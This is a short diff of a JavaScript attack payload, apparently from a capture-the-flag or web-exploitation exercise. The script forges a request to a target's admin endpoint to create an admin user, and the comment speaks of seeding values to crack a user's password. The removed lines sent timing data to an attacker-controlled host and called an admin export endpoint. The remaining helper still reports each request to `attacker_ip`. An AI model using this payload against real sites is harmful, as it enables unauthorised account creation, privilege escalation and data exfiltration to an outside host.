@@ -19,30 +19,13 @@ let config = {
       body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
   };
 
-  /// Create an Admin user and seed values to crack the users password
-let start = Date.now();
+// Create an Admin user and seed values to crack the users password
 doRequest(`http://${host_ip}/admin/users/create`, config);
-let end = Date.now();
-
-fetch(`http://${attacker_ip}/?start_time=` + start, {
-  mode: "cors",
-});
-
-fetch(`http://${attacker_ip}/?end_time=` + end, {
-  mode: "cors",
-});
-
-doRequest(`http://${host_ip}/admin/export`, config);
-
-
-
-
-
 
 // Helper Functions
 // very basic
 function doRequest(endpoint, cfg) {
-  fetch(endpoint, cfg).then(async (response) => {
+  return fetch(endpoint, cfg).then(async (response) => {
       fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
         mode: "cors",
       });   
